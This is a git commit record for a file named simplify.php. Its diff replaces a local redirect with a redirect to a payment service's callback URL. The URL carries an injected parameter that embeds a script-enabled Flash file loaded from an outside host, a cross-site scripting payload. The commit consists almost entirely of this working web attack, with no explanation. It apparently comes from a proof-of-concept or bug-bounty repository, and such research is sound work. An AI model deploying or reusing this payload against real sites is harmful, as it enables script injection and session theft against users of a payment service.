482ea864e295c72eb914bc05af4b8a486695ef4d
missoum1307 <missoum1307@users.noreply.github.com>
2018-01-09 22:43:15 +0100

    Update simplify.php

--- simplify.php
+++ simplify.php
@@ -1,4 +1,4 @@
-<?php header('location: /ifbypass.html
+<?php header('location: https://simplify.com/commerce/masterPass/callbackHandler?key=%3C?PXML%3E%3Chtml:embed%20allowscriptaccess=always%20src=//l0.cm/xss.swf%3E
 ')?>
 
 
